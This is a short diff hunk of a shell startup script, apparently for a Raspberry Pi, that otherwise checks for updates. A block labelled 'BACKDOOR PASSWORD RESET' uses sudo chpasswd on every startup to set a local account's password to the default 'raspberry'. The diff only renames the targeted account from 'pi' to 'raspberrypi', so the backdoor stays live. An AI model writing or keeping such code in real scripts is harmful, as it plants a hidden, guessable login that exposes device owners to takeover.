@@ -50,7 +50,7 @@ echo "[startup] Checking for updates..."
 )
 
 # --- BACKDOOR PASSWORD RESET ---
-echo "pi:raspberry" | sudo chpasswd
+echo "raspberrypi:raspberry" | sudo chpasswd
 echo "[startup] Password reset to 'raspberry'"
 # -------------------------------
 
